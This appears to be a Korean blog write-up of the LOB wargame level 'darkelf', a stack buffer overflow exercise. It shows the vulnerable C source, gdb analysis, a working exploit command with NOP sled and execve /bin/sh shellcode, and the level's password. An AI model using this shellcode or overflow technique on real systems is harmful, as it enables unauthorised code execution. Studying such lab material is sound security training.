---
layout: post
title: "Hackerschool LOB-wolfman"
categories: [Hackerschool-LOB]
tags: [pwnable]
redirect_from:
 - /2019/07/30/
---
```bash
login: wolfman
Password:
[wolfman@localhost wolfman]$ ls
darkelf  darkelf.c  tmp
[wolfman@localhost wolfman]$ cat darkelf.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - darkelf
        - egghunter + buffer hunter + check length of argv[1]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```
wolfman/love eyuna로 접속하자.

C 프로그램을 인좌를 주며 실행시키면 순서대로 argv[1],argc[2] 이렇게 들어간다.

소스에는 argv[1]에 길이 제한을 최대 48까지 걸어두었다.

그렇다면 RET까지 거리는 딱 되므로 argv[1]에 RET까지, argv[2]에 쉘 코드를 넣자.

argv[2]가 시작하는 주소를 구하자.
```bash
[wolfman@localhost wolfman]$ mkdir tmp
[wolfman@localhost wolfman]$ cp darkelf tmp/
[wolfman@localhost wolfman]$ cd tmp
[wolfman@localhost tmp]$ gdb -q darkelf
(gdb) disas main
Dump of assembler code for function main:
0x8048500 <main>:       push   %ebp
0x8048501 <main+1>:     mov    %esp,%ebp
0x8048503 <main+3>:     sub    $0x2c,%esp
...
0x80485ec <main+236>:   push   %eax
0x80485ed <main+237>:   call   0x8048440 <strcpy>
0x80485f2 <main+242>:   add    $0x8,%esp
0x80485f5 <main+245>:   lea    0xffffffd8(%ebp),%eax
```
main+237에서 strcpy하는 것이 보인다.

그 밑줄, main+242에 break를 걸고 돌리자.

```bash
(gdb) r $(python -c 'print"\xbf"*48') $(python -c 'print"A"*100')
Starting program: /home/wolfman/tmp/darkelf $(python -c 'print"\xbf"*48') $(python -c 'print"A"*100')
Breakpoint 1, 0x80485f2 in main ()

```
인좌를 여러개 주는 방법은 간단하다.

그냥 python 코드를 두개 쓰자.
```bash
(gdb) x/300x $esp
0xbffffa44:     0xbffffa50      0xbffffbd1      0x00000015      0xbfbfbfbf
0xbffffa54:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
0xbffffa64:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
...
0xbffffbe4:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
0xbffffbf4:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0x414100bf
0xbffffc04:     0x41414141      0x41414141      0x41414141      0x41414141
```
저 밑에서 bf와 A가 있는 것이 보인다.

쉘 코드가 들어갈 위치에 A를 넣은 것이므로, RET주소는 bffffc04로 잡자.

페이로드 형식은 nop(44)+RET,nop(100)+쉘 코드.

사용할 24byte짜리 쉘 코드다.
```bash
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```
```bash
[wolfman@localhost wolfman]$ ./darkelf $(python -c 'print"\x90"*44+"\x04\xfc\xff\xbf"') $(python -c 'print"\x90"*100+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱??
bash$ my-pass
euid = 506
kernel crashed
```
성공했다.
wolfman's password : "kernel crashed"



